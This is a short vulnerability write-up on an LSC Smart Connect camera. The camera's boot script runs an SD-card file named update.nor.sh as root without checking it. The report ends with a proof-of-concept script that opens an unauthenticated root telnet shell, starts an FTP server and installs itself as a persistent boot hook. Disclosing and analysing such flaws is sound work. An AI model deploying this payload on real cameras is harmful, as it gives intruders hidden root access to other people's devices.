---
title: "Vulnerability Report: LSC Smart Connect Camera"
date: 2024-02-15
description: "Abusing the SD-card update hook to spawn remote shells on LSC Smart Connect cameras."
tags:
  - iot
  - vulnerability
  - cve
---

### Vulnerability Report on LSC Smart Connect Camera

The vulnerability found consists of exploiting the update system in `start_app.sh`, more precisely via the SD card mount and the `update.nor.sh` file.

#### Configuration Variables

```sh
# routines of sd-card
# /mnt is for backword compatible
SDC_DIR=/mnt
SDC_HOOK=$SDC_DIR/update.nor.sh
SDC_FLAG_DEBUG=$SDC_DIR/__ipc_debug.ini
TMP_HOOK=/tmp/update.nor.sh
SENSOR_ISP_HOOK=$SDC_DIR/ISP/*t23.bin
# debug core-dump
WHERE_COREDMP="/mnt/sdc/coredmp"
WHERE_EXEC="/usr/local/bin/doraemon"
```
The section `local/sbin/start_app.sh:50–99` blindly trusts any file named **`update.nor.sh`** located on the SD card. During the boot process, the script:

- mounts the SD card,
- copies `update.nor.sh` to `/tmp/update.nor.sh`,
- performs **no validation** of its contents, integrity, permissions, or ownership.

Later in the startup sequence (`local/sbin/start_app.sh:108–129`), the copied file is:

- marked as executable,
- run **as root**,  
- executed with the SD card’s mount point passed as an argument.

This execution occurs **before the main `ipc_service` starts**, meaning the script runs in a **highest-privilege environment** where networking utilities, watchdog functions, and upgrade helpers are already available.

#### Available Utilities

The exploit consists of creating a shell and opening a port via telnetd, which is present on the camera:

```sh
/bin # busybox --list
[...]
sh
sleep
swapoff
syslogd
tail
tar
tcpsvd
telnetd
[...]
```

#### Proof of Concept

We just need to write a .sh script to the SD card and name it update.nor.sh.

The exploit I choose is :

```sh
#!/bin/sh

telnetd -l /bin/sh -p 2323 &

echo "Telnet start by update.nor.sh" > /tmp/exploit_success

mkdir -p /tmp/ftp
echo "FTP server test" > /tmp/ftp/test.txt
ftpd -w /tmp/ftp -p 2121 &

cp /mnt/update.nor.sh /mnt/config/hook-boot.sh

date > /tmp/exploit_time
```

We confirm that the port is open.

![alt text](netstat.png)

We connect via telnet:

![alt text](image.png)
